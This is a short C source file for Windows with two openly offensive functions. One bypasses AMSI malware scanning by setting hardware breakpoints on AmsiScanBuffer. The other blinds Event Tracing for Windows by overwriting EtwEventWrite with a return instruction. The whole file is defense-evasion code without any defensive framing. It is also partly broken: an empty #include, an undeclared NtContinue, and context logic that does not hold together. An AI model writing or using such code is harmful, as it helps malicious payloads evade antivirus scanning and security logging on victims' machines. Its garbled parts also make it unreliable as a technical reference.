#include <windows.h>
#include 

// Patchless AMSI via VEH² + hardware breakpoints
void GhostAMSI() {
    CONTEXT ctx;
    HANDLE hThread = GetCurrentThread();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(hThread, &ctx);
    
    void* amsiFunc = GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    ctx.Dr0 = (DWORD_PTR)amsiFunc;
    ctx.Dr7 = 0x00000001; // Active le breakpoint matériel
    
    __try {
        RaiseException(EXCEPTION_BREAKPOINT, 0, 0, NULL);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        NtContinue(&ctx, FALSE); // Contourne EtwTiLogSetContextThread
    }
}

// Patch ETW via NtTraceEvent
void DisableETW() {
    void* etwFunc = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");
    DWORD oldProtect;
    VirtualProtect(etwFunc, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)etwFunc = 0xC3; // Retour immédiat
    VirtualProtect(etwFunc, 1, oldProtect, &oldProtect);
}